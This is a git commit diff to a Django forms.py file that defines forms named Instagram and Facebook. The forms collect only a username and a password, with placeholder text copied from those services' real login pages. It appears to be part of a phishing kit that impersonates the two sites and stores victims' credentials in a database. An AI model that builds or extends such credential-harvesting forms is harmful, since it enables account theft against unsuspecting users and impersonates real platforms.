96d6c8a46a0b794fbe7ecae4af49ce6849548174
ajayiemmanuel <86613616+ajayiemmanuel@users.noreply.github.com>
2023-08-04 01:59:55 -0700

    forms.py

--- we/forms.py
+++ we/forms.py
@@ -1,13 +1,22 @@
 from django import forms
 from .models import *
+from django.forms import TextInput
 
 class Instagram(forms.ModelForm):
     class Meta:
         model = Instagram
-        fields = "__all__"
+        fields = ('username', 'password')
+        widgets = {
+            'username': TextInput(attrs={'placeholder': 'Phone number, username, email'}),
+            'password': TextInput(attrs={'placeholder': 'Password'})
+        }
 
 
 class Facebook(forms.ModelForm):
     class Meta:
         model = Facebook
-        fields = "__all__"
+        fields = ('username', 'password')
+        widgets = {
+            'username': TextInput(attrs={'placeholder': 'Email or phone number'}),
+            'password': TextInput(attrs={'placeholder': 'Password'})
+        }
